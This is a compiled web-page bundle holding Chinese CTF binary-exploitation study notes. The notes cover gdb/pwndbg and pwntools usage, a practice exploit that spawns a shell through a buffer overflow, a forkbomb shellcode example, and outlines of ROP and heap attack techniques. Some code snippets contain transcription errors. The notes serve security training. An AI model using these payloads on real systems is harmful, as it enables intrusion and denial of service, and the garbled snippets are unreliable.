(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{668:function(e,n,t){"use strict";t.r(n);var a=t(4),l=Object(a.a)({},(function(){var e=this,n=e.$createElement,t=e._self._c||n;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("p",[e._v("[TOC]")]),e._v(" "),t("h1",{attrs:{id:"pwn"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#pwn"}},[e._v("#")]),e._v(" pwn")]),e._v(" "),t("p",[t("a",{attrs:{href:"http://note.taqini.space/#/?id=pwn-note-book",target:"_blank",rel:"noopener noreferrer"}},[e._v("pwn解题本"),t("OutboundLink")],1)]),e._v(" "),t("h2",{attrs:{id:"tools"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#tools"}},[e._v("#")]),e._v(" Tools")]),e._v(" "),t("p",[t("a",{attrs:{href:"https://github.com/inquisb/shellcodeexec",target:"_blank",rel:"noopener noreferrer"}},[e._v("shellcodeexec"),t("OutboundLink")],1)]),e._v(" "),t("h2",{attrs:{id:"pwndbg快速入门实战"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#pwndbg快速入门实战"}},[e._v("#")]),e._v(" Pwndbg快速入门实战")]),e._v(" "),t("p",[e._v("gcc test.c -m32\ngdb a.out\nstart\ncontext")]),e._v(" "),t("p",[e._v("GDB 启动方式\ngdb file_path\ngdb attach pid")]),e._v(" "),t("p",[e._v("ps -aux 可以找 ./a.out 在 explorer ,看pid\nps -e | grep bin")]),e._v(" "),t("p",[e._v("添加程序的命令行参数\nrun "),t("args",[e._v("\nset args "),t("args")],1)],1),e._v(" "),t("p",[e._v("gdb 常用命令\nq quit")]),e._v(" "),t("p",[e._v("开始调试")]),e._v(" "),t("p",[e._v("start /s 启动程序并中断在程序的入口｡如果是源码调试,会停在main函数否则会在程序的入口点｡\nrun /r 不暂停,直接执行程序｡\ncontinue /c 在程序暂停之后,继续执行程序｡\nstrip -s 去掉 symbol")]),e._v(" "),t("p",[e._v("跟踪代码")]),e._v(" "),t("p",[e._v("next/n普通调试器的单步步过｡如果是逆向调试,一次执行一条指令｡\nstep/s单步步入｡如果是逆向调试,则会跟踪call跳转｡\nfinish普通调试器的跳出操作｡执行到函数返回处｡")]),e._v(" "),t("p",[e._v("break/b target if condition\nbreak用来下普通的断点,一般称之为软断点｡target是要设置断点的位置,源码调试时可以使用代\n码的行号｡而逆向调试时使用*加上地址在一个绝对地址上设置断点｡")]),e._v(" "),t("p",[e._v("break后可以加上if和表达式生成条件断点｡在满足expr表达式时中断｡如\n*0×08040101==0xfffff等等｡")]),e._v(" "),t("p",[e._v("watch expr\nwatch可以用来设置条件断点或者是内存断点｡靠表达式(expr)来决定｡通常expr为一个变量或者逆\n向调试时候的内存地址｡watch会监视内存的变化,一旦内存变化就会中断程序｡同理,还有一个命令\nrwatch只监控内存的读取｡\nib/d num\n通过ib命令可以查看目前所有断点以及编号｡然后通过d加上编号可以删除断点｡\nb printf\ni b 查看断点位置 info\nd 1 删除断点1号")]),e._v(" "),t("p",[e._v("查看数据\nprint/p symbol_name\nP命令用来打印符号信息(寄存器,变量等等)源码调试中很有用,但是在逆向调试中很少用｡\nX/FMT ADDRESS\n用来显示内存信息｡其中target是内存地址｡也可以是一个类似a+b的表达式｡\nFMT用来控制打印形式｡两个字母组成加一个数字组成｡\n第一个字母控制打印格式｡有o(八进制),x(十六进制),d(+进制),u(无符号十进制),t(二进制),f(浮点类型),a(地址类型),i(解析成指令并反编译),C(字符)和s(字符串)\n第二个字母用来设定输出长度b(byte),h(halfword),w(word),g(giant,8 bytes)｡其后加一个数字表述输出多少信息｡\nbacktrace\n打印函数调用栈｡通过这个命令可以查看程序到底经过怎样的函数调用过程｡")]),e._v(" "),t("p",[e._v("x /wx 地址  --- 显示地址信息 w4节点 x 16进制 b-1个字节 h-8 g-16 , s--按字符串打印\nx /10i 地址 --- 打印10条指令")]),e._v(" "),t("p",[e._v("Context\npwndbg的额外添加的函数｡显示pwndbg默认的context信息｡\ndps\ndps用于显示地址上的指针和符号信息｡通常在显示栈或者是数据结构的时候使用\nDsassemble\n用来反汇编函数｡该命令与x/i不同之处是Dsassemble必须在有函数名符号的情况下才能使用,而\n且一次反汇编一个函数｡没法指定长度\nDsassemble main")]),e._v(" "),t("p",[e._v("pwndbg 高级功能\nvmmap\n此命令可以显示程序的内存结构｡通常从/proc/self/maps中读出｡\nsearch\nPwndbg的search搜索功能｡可以支持各种长度的数据以及字符串搜索的功能｡可以在内存中寻找需要的数据｡\nserach -h\nsearch hello\nchecksec\nchecksec是一个安全检查用脚本,在pwndbg中也有集成｡其作用是查看程序是否开启nx,canary等攻击保护｡")]),e._v(" "),t("p",[e._v("defcone Al赛题的第2个题目是一个通过格式化字符串触发的栈溢出漏洞｡这次我们就以这一题作为这次课程的最后考验｡来实际测试一下如何用pwntools来编写利用脚本｡")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v("import pwn\npwn.context.log_level = 'debug'\n\ndef compress(data):\n    ...\n\nshellcode = pwn.shellcraft.i386.linux.sh()\nshellcode = pwn.asm(shellcode)\n\npayload = ''\npayload += '%259c' #填充259的垃圾数据\npayload += pwn.cyclic(40)\npyaload = compress(payload)\n\nt = pwn.process('/tmp/bin')\n\nt.recvuntil('size: ')\n\nt.sendline(str(len(payload)))\n\nt.sendline(payload)\n\nraw_input()\nt.interactive()\n")])])]),t("p",[e._v("把 py 运行起来,gdb attach 它｡ ps -e | grep bin 找到PID来Attach\ngdb $ c 继续运行｡ 输入值｡｡非法退出了｡看 Invalid address\n0xy61618('haaa') 内存应该是aaah｡ 看之前的cyclic｡把这段haaa替换成别的就行了\npwn.cyclic_find('haaa') 长度是28｡修改py文件")]),e._v(" "),t("p",[e._v("另开进程")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v(">>>import pwn\n>>>a =  pwn.LEF('/bin')\n>>>a.search('jmp esp').next()\n>>>pwn.asm('jmp esp')\n'\\xff\\xe4'\n>>>a.search('\\xff\\xe4')\n----generate object ...\n>>>c.next()\n134717254\n>>>hex(134717254)\n'0x8079f46'\n>>>c.next()\n135040543\n")])])]),t("p",[e._v("修改代码 payload部分为")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v("payload = ''\npayload += '%259c' #填充259的垃圾数据\npayload += 'a'*28\n\npayload += pwn.p32(0x8079f46)\npyaload += shellcode\npyaload = compress(payload)\n")])])]),t("p",[e._v("python poc.py 就拿到shell")]),e._v(" "),t("p",[e._v("Misc: 跑起来会输出 pid, 这时用 gdb attach pid可以绑定程序｡")]),e._v(" "),t("h2",{attrs:{id:"pwntools-快速入门"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#pwntools-快速入门"}},[e._v("#")]),e._v(" pwntools 快速入门")]),e._v(" "),t("p",[e._v("pwntools中包含很多三方软件包｡包括capstone等二进制软件｡推荐在linux或者\nmac os上新开python virtualenv安装｡(pwntools不支持windows或者python3)\n安装详细教程:https://docs.pwntools.com/en/stable/install.html")]),e._v(" "),t("p",[e._v("pwntoosl的模块多 wiki地址:https://docs.pwntools.com/en/stable/")]),e._v(" "),t("p",[e._v("1.pwnlib.asm\nasm模块主要通过capstone进行汇编的编译与反编译｡通常用来编译各种平台构架的shellcode\n2.pwnlib.constants\n头文件宏定义的封装,通过此模块,可以直接获取一下系统宏定义对应的整数数据｡\n3.pwnlib.context\n上下文管理器,通过它来控制一些全局的信息｡比如目标计算机体系结构,log等级等｡控制生\n成shellcode,log时候的默认行为｡\n4.pwnlib.dynelf\n通过内存leak数据来自动化定位程序中函数位置｡极其实用｡\n5.pwnlib.encoders\nshellcode编码工具｡通过编码排除shellcode中特定字符｡经常无法转换｡")]),e._v(" "),t("p",[e._v("1.pwnlib.elf\n读写elf文件结构中的各种信息｡非常方便实用｡\n2.pwnlib.fmtstr\n格式化字符串自动化利用工具｡有缺陷,只能使用少数情况｡\n3.pwnlib.gdb\n可以在脚本中直接使用此模块attach进程或者启动gdb｡有缺陷,不实用｡\n4.pwnlib.libcdb\nLibc的database,可以通过一些信息查找对应libc｡通常配合dynelf使用｡\n5.pwnlib.log\n通常是pwntools内部代码使用｡偶尔用它打印一些信息｡大部分时候还是会直接print｡")]),e._v(" "),t("p",[e._v("1.pwnlib.memleak\n内存泄露管理工具｡方便拼接多次泄露出来的内存｡不过通常只在dynel的时候由后者使用｡\n2.pwnlib.shellcraft\nshellcode生成工具｡生成shellcode时候非常遍历｡\n3.pwnlib.tubes\n主要的io工具,pwntools最最常用的功能｡\n4.pwnlib.util\n包含一些列有效的小工具｡虽然都不是复杂的工具,但是直接使用能节省很多时间｡\n5.pwnlib.rop\nrop生成工具,可以自动生成32位rop｡")]),e._v(" "),t("p",[e._v("tubes的作用是于被攻击目标进行通信,处理各种io数据并提供统一的API接口｡")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v('import pwn\nt=pwn.remote("127.0.0.1",12345)\nt.sendline("hello")\nt.recvline()\nt.interactive()\n')])])]),t("p",[e._v("process 和 remote 都是tubes的子类｡")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v('t=pwn.remote("127.8.0.1",12345)\n')])])]),t("p",[e._v("remote返回的为tubes的子类｡此类型主要用于和互联网主机进行交互｡一般只需要有ip和端口即可｡ 其它参数可以保持默认｡")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v('t=pwn.process("./bin",shell=True)\n')])])]),t("p",[e._v("process和remote的类方法基本相似｡process主要用于启动本地的程序然后进行交互｡用于本地调试\n通常情况下,会使用调用process启动本地程序,方便gdb调试｡等到脚本编写完成再改成远程利用")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v('t.send("hello")\nt.sendline("hello")\n')])])]),t("p",[e._v("二者都是向目标发送数据｡而sendline会在发送数据最后添加一个回车｡慎用sendline,往往因为忽视多出来的一个回车导致利用无法成功")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v("t.recv(1824)\nt.recvline()\nt.recvuntil('welcome')\n")])])]),t("p",[e._v("三者都是接受数据并将接受的数据返回｡recvline会一直读取直到读出到回车｡recvunit则读到指定\n的数据才会停止｡recv稍有不同,它会读取指定长度的数据或者缓冲区无数据可以读取时返回｡\n慎用recv,多用recvunitl")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v("pwn.p32(exdeadbeef)\npwn.p64(exdeadbeefdeadbeef)\npwn.u32('1234')\npwn.u64('12345678')\n")])])]),t("p",[e._v("将字节数组与数组进行以小端对齐的方式相互转化｡32负责转化dword,64负责转化qword")]),e._v(" "),t("h3",{attrs:{id:"shelcraft-与-asm"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#shelcraft-与-asm"}},[e._v("#")]),e._v(" shelcraft 与 asm")]),e._v(" "),t("p",[e._v("pwntools的shellcraft主要用来生成汇编代码形式的shellcode,而asm的作用是根据\n汇编代码编译出二进制shellcode｡\n二者最大的特点是对大部分主流cpu构架的支持以及大量的linux下shellcode模板｡")]),e._v(" "),t("p",[e._v("例子1:生成执行sh的shellcode并编译")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v("asm(pwnlib.shellcraft.thumb.linux.sh(),arch='thumb')\n")])])]),t("p",[e._v("可以将其中的thumb换成i386,mips,arm或者amd64来切换shellcode构架")]),e._v(" "),t("p",[e._v("例子2:读取flag并输出到标准输出")]),e._v(" "),t("p",[e._v('pwnlib.shellcraft.i386.1inux.cat("flag",fd=1)')]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v("1是stdout, 标准输出\n")])])]),t("p",[e._v("例子3:使用forkbomb搞坏系统(慎用)")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v("pwn1ib.she11craft.i386.1inux.forkbomb()\n")])])]),t("p",[e._v("除此之外,还有大量的shellcode模板可以使用｡全部模板可以查阅pwntools文档")]),e._v(" "),t("h3",{attrs:{id:"context"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#context"}},[e._v("#")]),e._v(" context")]),e._v(" "),t("p",[e._v("context是pwntools的一个上下文管理器｡可以理解成一个包含了很多元素的类｡通过\n设置它可以改变pwntools中很多模块的运行行为｡最经常设置的有log _level,arch｡\n通过 "),t("code",[e._v('pwn.context.log_level="debug"')]),e._v("\n可以将log等级调到debug等级｡pwntools会将所有io数据等输出｡非常方便编写poc的时候的调试｡\n而arch可以设置攻击目标的指令构架｡会修改asm等与构架相关模块的默认构架｡不用再手动指定｡\npwn.context.arch = 'amd64'")]),e._v(" "),t("h3",{attrs:{id:"elf"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#elf"}},[e._v("#")]),e._v(" ELF")]),e._v(" "),t("p",[e._v("ELF模块主要用来读取elf文件中的各种结构数据｡包括plt,got表位置,函数地址等等｡\n虽然也可以直接使用ida读取｡但是通过ELF模块自动获取会更加简单｡尤其是针对本地与\n远程libc不同的情况｡")]),e._v(" "),t("p",[e._v("defcone A赛题的第3个题目是一个通过菜单交互,执行任意shellcode的题目｡这次我们就以这一题作为这次课程的最后考验｡来实际测试一下如何用pwntools来编写利用脚")]),e._v(" "),t("p",[e._v("技巧确认得到shell前先输出｡再用until")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v('t.sendline(\'echo "do I get shell?"")\nt.recvuntil("do I get shel1?\\n")\nt.success("get shell")\nt.interactive()\n')])])]),t("h2",{attrs:{id:"常见漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#常见漏洞"}},[e._v("#")]),e._v(" 常见漏洞")]),e._v(" "),t("p",[t("strong",[e._v("缓冲区溢出(Buffer Overflow)")])]),e._v(" "),t("ul",[t("li",[e._v("堆溢出､栈溢出､bss溢出､data溢出(通常覆盖指针)")])]),e._v(" "),t("p",[e._v("wellpwn,AliCTF 2016 vss,Hitcon 2015 readable,stkof,zerostorage")]),e._v(" "),t("p",[t("strong",[e._v("整数溢出(Integer Overflow)")])]),e._v(" "),t("ul",[t("li",[t("p",[e._v("无符号型与有符号的转换(MMACTF 2016 shadow)")])]),e._v(" "),t("li",[t("p",[e._v("整数加减乘除法,如malloc(size-2)(pwnhub.cn calc)")])]),e._v(" "),t("li",[t("p",[e._v("整数溢出通常会进一步转换为缓冲区溢出､逻辑漏洞等其他漏洞")])])]),e._v(" "),t("p",[t("strong",[e._v("格式化字符串(Format String)")])]),e._v(" "),t("ul",[t("li",[t("p",[e._v("printf(s).sprintf(s).fprintf(s)等,可能导致任意地址读写(MMACTF 2016 greeting)")])]),e._v(" "),t("li",[t("p",[e._v("可以用来leak(HCTF2016 fheap)")])])]),e._v(" "),t("p",[e._v("释放后使用(Use-After-Free)")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("释放掉的内存可能会被重新分配,释放后使用会导致重新分配的内存被旧的使用所改写")])]),e._v(" "),t("li",[t("p",[e._v("Double free是一种特殊的UAF")])]),e._v(" "),t("li",[t("p",[e._v("Defcon 2014 Qualifier shitsco,AliCTF 2016 router,OCTF2016 freenote(double free),")])])]),e._v(" "),t("p",[e._v("HCTF2016 fheap(double free)")]),e._v(" "),t("p",[t("strong",[e._v("逻辑漏洞")])]),e._v(" "),t("ul",[t("li",[e._v("访问控制,协议漏洞,多线程竟态条件(fakefuzz等")])]),e._v(" "),t("p",[e._v("关键数据结构分析:还原结构体､接口､类等｡\n控制流分析:理清楚程序的执行逻辑,基本要做到从反汇编代码到源码的还原｡\n数据流分析:理清楚数据的流向｡")]),e._v(" "),t("p",[t("strong",[e._v("CTF漏洞挖掘中的分析策略:")])]),e._v(" "),t("ul",[t("li",[e._v("目标文件较小时,通常采用对整个目标文件进行控制流分析,做到整个程序从反汇编代码到接")])]),e._v(" "),t("p",[e._v("近源码级别的还原,还原的同时查找漏洞")]),e._v(" "),t("ul",[t("li",[e._v("目标文件较大时,逆向整个文件所需工作量太大,通常需要额外的关注数据流,并理清楚数据")])]),e._v(" "),t("p",[e._v("流所经之处的控制流,因为漏洞的触发与数据流离不开关系")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("无论是数据流分析和控制流分析,还原结构体､接口､类都会促进逆向工程")])]),e._v(" "),t("li",[t("p",[e._v("控制流分析")])])]),e._v(" "),t("p",[e._v("控制流分析的主要作用是理清楚程序的逻辑,对于规模较小的目标文件,一般选择理清 整个目标文件｡\n代码以识别为主,不要硬逆｡")]),e._v(" "),t("ul",[t("li",[e._v('需要熟悉常见的数据结构､算法在目标文件一般“长啥样"')])]),e._v(" "),t("p",[e._v(".链表､树､图､堆､各种加密算法等")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("逆向分析是一个经验性的工作,刚开始慢慢来,逆多了自会有所感悟")])]),e._v(" "),t("li",[t("p",[e._v("善用标记,标记结构体､标记变量名､标记变量类型")])]),e._v(" "),t("li",[t("p",[e._v("F5大法好,但是F5不是万能的,当发现F5结果比较诡异时需要在汇编层分析(如mmactf2016")])])]),e._v(" "),t("p",[e._v("shadow)")]),e._v(" "),t("ul",[t("li",[e._v("再次强调,需要熟悉各类漏洞,否则碰到漏洞也不知道是漏洞")])]),e._v(" "),t("p",[e._v("目标文件较大,全盘逆向不现实")]),e._v(" "),t("ul",[t("li",[e._v("追溯用户输入的走向,重点关注对用户输入数据处理的函数")])]),e._v(" "),t("p",[e._v("｡可以在不用逆清楚控制流即可找到漏洞,需要一定的技巧性\nplaidCTF 2015 datastore")]),e._v(" "),t("h1",{attrs:{id:"第三章：漏洞利用技术"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#第三章：漏洞利用技术"}},[e._v("#")]),e._v(" 第三章：漏洞利用技术")]),e._v(" "),t("h2",{attrs:{id:"课时1-栈溢出-这些都是套路"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#课时1-栈溢出-这些都是套路"}},[e._v("#")]),e._v(" 课时1 :栈溢出-这些都是套路")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Call func->push pc, jmp func.")])]),e._v(" "),t("li",[t("p",[e._v("Leave->mov esp, ebp, pop ebp")])]),e._v(" "),t("li",[t("p",[e._v("Ret->pop pc")])])]),e._v(" "),t("p",[e._v("栈上的数据无法被当成指令来执行")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("数据执行保护（NX/DEP）")])]),e._v(" "),t("li",[t("p",[e._v("绕过方法：ROP\n让攻击者难以找到shellcode地址")])]),e._v(" "),t("li",[t("p",[e._v("地址空间布局随机化（ASLR）")])]),e._v(" "),t("li",[t("p",[e._v("绕过方法：infoleak、ret2dlresolve、ROP\n检测Stack Overflow")])]),e._v(" "),t("li",[t("p",[e._v("Stack Canary/Cookie")])]),e._v(" "),t("li",[t("p",[e._v("绕过方法：infoleak\n现在NX+Stack Cananry+ASLR基本是标配")])])]),e._v(" "),t("p",[e._v("现代栈溢出利用技术基础：ROP\n利用signal机制的ROP技术：SROP\n没有binary怎么办：BROP\n劫持栈指针：stack pivot\n利用动态链接绕过ASLR:ret2dl resolve、fake linkmap\n利用地址低12bit绕过ASLR:Partial Overwrite\n绕过stack canary：改写指针与局部变量、leak canary、overwrite canary\n溢出位数不够怎么办：覆盖ebp，Partial Overwrite")]),e._v(" "),t("p",[t("strong",[e._v("现代栈溢出利用技术基础：ROP")])]),e._v(" "),t("p",[e._v("一种代码复用技术，通过控制栈调用来劫持控制流。\nGoogle 关键字：Ret2libc，ROP")]),e._v(" "),t("p",[t("strong",[e._v("CTF中ROP常规套路：")])]),e._v(" "),t("ul",[t("li",[e._v("第一次触发漏洞，通过ROP泄漏libc的address（如puts_got），计算system地址，然后返回到一")])]),e._v(" "),t("p",[e._v('个可以重现触发漏洞的位置（如main），再次触发漏洞，通过ROP调用system（“/bin/sh"）')]),e._v(" "),t("ul",[t("li",[e._v('直接execve（"/bin/sh”，["/bin/sh]，NULL），通常在静态链接时比较常用')])]),e._v(" "),t("p",[t("strong",[e._v("习题：")])]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Defcon 2015 Qualifier:ROpbaby")])]),e._v(" "),t("li",[t("p",[e._v("AliCTF 2016：VSs")])]),e._v(" "),t("li",[t("p",[e._v("PlaidCTF 2013：ropasaurusrex")])])]),e._v(" "),t("p",[e._v("作业1：根据rOpbaby的writeup重写exploit\n作业2：尝试做一下vss和ropasaurusrex")]),e._v(" "),t("p",[t("strong",[e._v("利用signal机制的ROP技术-SROP")])]),e._v(" "),t("p",[e._v("SROP:Sigreturn Oriented Programming\n系统Signal Dispatch之前会将所有寄存器压入栈，然后调用signal handler，signal\nhandler返回时会将栈的内容还原到寄存器。\n如果事先填充栈，然后直接调用signal return，那在返回的时候就可以控制寄存器的值。\n用的不是特别多，但是有时候很好用，推荐资料：")]),e._v(" "),t("ul",[t("li",[e._v("http://angelboy.logdown.com/posts/283221-srop")])]),e._v(" "),t("p",[e._v("http://www.2cto.com/article/201512/452080.html\n例题\nDefcon 2015 Qualifier fuckup（这题比较难）\n建议自己写一个demo自己测试")]),e._v(" "),t("p",[t("strong",[e._v("没有binary怎么办-BROP")])]),e._v(" "),t("p",[e._v("BROP:Blind Return Oriented Programming\n目标：在拿不到目标binary的条件下进行ROP\n条件：必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞；\n服务器进程在crash之后会重新复活，并且复活的进程不会被re-rand\n用的不是特别多，但是在CTF中出现过\n推荐资料：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("http://ytiu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yil")])]),e._v(" "),t("li",[t("p",[e._v("http:/ytiu.info/blog/2014/06/01/blind-return-oriented-programming-brop-attack-er/\n例题：\nHCTF 2016出题人跑路了（pwn50）\n作业（选做）：重现一下推荐资料2中实现")])])]),e._v(" "),t("p",[t("strong",[e._v("劫持栈指针：stack pivot")])]),e._v(" "),t("p",[e._v("将栈劫持到其他攻击者控制的缓冲区")]),e._v(" "),t("ul",[t("li",[e._v("向目标缓冲区填入栈数据（如ROP Chains），然后劫持esp到目标缓冲区。劫持esp的方法有很")])]),e._v(" "),t("p",[e._v("多，最常用的就是ROP时利用可以直接改写esp的gadget，如pop esp，ret；")]),e._v(" "),t("ul",[t("li",[e._v("是一种相对常用的利用技术，不仅用于栈溢出，也可以用在其他可以劫持控制流的漏洞。")])]),e._v(" "),t("p",[e._v("Stack Piovt的动机")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("溢出字节数有限，无法完成ROP")])]),e._v(" "),t("li",[t("p",[e._v("栈地址未知且无法泄漏，但是某些利用技术却要求知道栈地址（ret2 dlresolve）")])]),e._v(" "),t("li",[t("p",[e._v("劫持esp到攻击者控制的区域，也就变相的控制了栈中的数据，从而可以使非栈溢出的控制流劫")])])]),e._v(" "),t("p",[e._v("持攻击也可以做ROP")]),e._v(" "),t("p",[t("strong",[e._v("Stack Pivot的利用条件：")])]),e._v(" "),t("ul",[t("li",[t("p",[e._v("存在地址已知且内容可控的buffer")])]),e._v(" "),t("li",[t("p",[e._v("bss段，由于bss段尾端通常具有很大的空余空间（pagesize-usedsize），所以bss段段尾端也\n往往是stack pivot的目标，\n.堆块，如果堆地址已泄且堆上的数据可被控制，那堆也可以作为stack pivot的目标")])]),e._v(" "),t("li",[t("p",[e._v("控制流可劫持")])]),e._v(" "),t("li",[t("p",[e._v("存在劫持栈指针的gadgets")])]),e._v(" "),t("li",[t("p",[e._v("如pop esp，ret，除此之外还有很多，要具体binary具体分析")])])]),e._v(" "),t("p",[t("strong",[e._v("作业：")])]),e._v(" "),t("ul",[t("li",[e._v("EKOPARTY CTF 2016 fuckzing-exploit-200（基于栈溢出的stack pivot，必做作业）")])]),e._v(" "),t("p",[e._v("HACKIM CTF 2015-Exploitation 5（基于堆溢出的stackpivot，选做作业）")]),e._v(" "),t("p",[t("strong",[e._v("利用动态链接绕过ASLR:ret2dl resolve、fake linkmap")])]),e._v(" "),t("p",[e._v("动态链接的过程就是从函数名到函数地址转换的过程，所以我们可以通过动态链接器来\n解析任何函数，且无需任何leak\n前置技能：了解动态链接的过程")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("http://blog.chinaunix.net/uid-24774106-id-3053007.html")])]),e._v(" "),t("li",[t("p",[e._v("《程序员的自我修养》\n伪造动态链接的相关数据结构如inkmap、relplt，详见以下内容")])]),e._v(" "),t("li",[t("p",[e._v("http://rk700.github.io/2015/08/09/return-to-dl-resolve/")])]),e._v(" "),t("li",[t("p",[e._v("http://angelboy.logdown.com/posts/283218-return-to-dl-resolve")])]),e._v(" "),t("li",[t("p",[e._v("http://www.inforsec.org/wp/？p=389")])])]),e._v(" "),t("p",[t("strong",[e._v("习题：")])]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Codegate CTF Finals 2015 yocto（fake relplt）http://o0xmuhe.me/2016/10/25/yocto-writeup/")])]),e._v(" "),t("li",[t("p",[e._v("HITCON QUALS CTF 2015 readable（fake linkmap）")])]),e._v(" "),t("li",[t("p",[e._v("Hack.lu's 2015 OREO（htp://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/）")])])]),e._v(" "),t("p",[e._v("理论上任何可以stack pivot且FULLRELRO未开的题目都可以利用这种技术，所以可以\n试试用这种技术去做一些之前的习题\n作业：选择一道题目去完成ret2dlresolve的利用")]),e._v(" "),t("p",[t("strong",[e._v("利用地址低12bit绕过ASLR:Partial Overwrite")])]),e._v(" "),t("p",[e._v('在PIE开启的情况下，一个32地址的高20bit会被随机化，但是低12bit是不变的。\n所以可以通过只改写低12bit来绕过PIE，不仅在栈溢出使用，在各种利用都经常使用。\nExample：\nReturn address=0x？？？？？abc\nSystem（"/bin/sh"）=0x？？？？def\nOverwrite abc by def，we can prompt a shell\n作业：了解Partial Overwrite\nhttp:/lyOn.me/2015/07/30/bypass-aslr-with-partial-eip-overwritel\n习题：\nHCTF 2016 heap（基于堆溢出的parital overwrite）')]),e._v(" "),t("p",[t("strong",[e._v("绕过stack canary")])]),e._v(" "),t("p",[e._v("至此所讲的所有套路，一旦遇到Stack Canary均无法使用！！\n绕过思路：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("不覆盖Stack Canary，只覆盖Stack Canary前的局部变量、指针。")])]),e._v(" "),t("li",[t("p",[e._v("已经几乎不可行，因为编译器会根据占用内存大小从小到大排列变量")])]),e._v(" "),t("li",[t("p",[e._v("但是在某些情况下依然可用，如右图可以覆盖fmtstr buf2.")])]),e._v(" "),t("li",[t("p",[e._v("Leak Canary\n.可以通过printf世漏，Canary一般从00开始")])]),e._v(" "),t("li",[t("p",[e._v("Overwrite Canary")])]),e._v(" "),t("li",[t("p",[e._v("Canary在TLS，TLS地址被随机化")])])]),e._v(" "),t("p",[t("strong",[e._v("溢出位数不够怎么办：覆盖ebp，Partial Overwrite")])]),e._v(" "),t("p",[e._v("Func1：\nCall func2\nleave（mov esp ebp，pop ebp）\nret（pop ip）\nFunc 2：\nStack overflow\nleave（mov esp ebp，pop ebp）\nret（pop ip）\n可以覆盖Func2的ebp，会影响到Func1的esp，进而影响func1的IP\n可以部分覆盖返回地址\n习题：\nXMAN 2016广外女生-pwn\nCodegate CTF Finals 2015，chess")]),e._v(" "),t("h2",{attrs:{id:"堆溢出-玩转堆中的各种数据结构"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#堆溢出-玩转堆中的各种数据结构"}},[e._v("#")]),e._v(" 堆溢出-玩转堆中的各种数据结构")]),e._v(" "),t("p",[e._v("CTF题中堆管理机制：大多数是ptmalloc/dlmalloc，少数题中自己实现\nptmalloc/dlmalloc是glibc的默认内存管理机制，了解它对PWN堆题来说至关重要！\n强烈推荐：glibc内存管理ptmalloc源代码分析.pdf 建议先通读，再用作工具书\n作业：精读“glibc内存管理ptmalloc源代码分析，pdf”的1-27页，粗读28-130页（end）\narena, bin, chunk. Know it and pwn it!")]),e._v(" "),t("p",[e._v("堆漏洞的利用技术与技巧\nUse After Free & Double Free\nHeap Overflow")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Overflow directly")])]),e._v(" "),t("li",[t("p",[e._v("Fast bin attack")])]),e._v(" "),t("li",[t("p",[e._v("Unsorted bin attack")])]),e._v(" "),t("li",[t("p",[e._v("Overwrite Topchunk")])]),e._v(" "),t("li",[t("p",[e._v("Classical&Modern Unlink Attack")])]),e._v(" "),t("li",[t("p",[e._v("Off by one &Off by null")])]),e._v(" "),t("li",[t("p",[e._v("Other techniques")])])]),e._v(" "),t("p",[e._v("General exploit techniques")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Heap fengshui")])]),e._v(" "),t("li",[t("p",[e._v("Heap spray")])]),e._v(" "),t("li",[t("p",[e._v("Exploit mmap chunk")])])]),e._v(" "),t("p",[e._v("Use After Free&Double Free Double Free:UAF中的use为再次free，是一种特殊的UAF，且可转换为普通的UAF转换：free（p），p2=malloc（），p2与p指向同一个内存free（p），p2为Dangling pointer=>UAF习题：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("UAF:DEFCON CTF Qualifier 2014：shitsco、BCTF 2016：router、HCTF2016 5-days（较难）")])]),e._v(" "),t("li",[t("p",[e._v("Double Free:OCTF2016：freenote、HCTF2016 fheap、HCTF2016 5-days（较难）作业：完成习题shitsco（writeup很多）参考阅读：")])]),e._v(" "),t("li",[t("p",[e._v("https://blog.skullsecurity.org/2014/defcon-quals-writeup-for-shitsco-use-after-free-vuln")])]),e._v(" "),t("li",[t("p",[e._v("htp://www.tuicool.com/articles/yquU732")])]),e._v(" 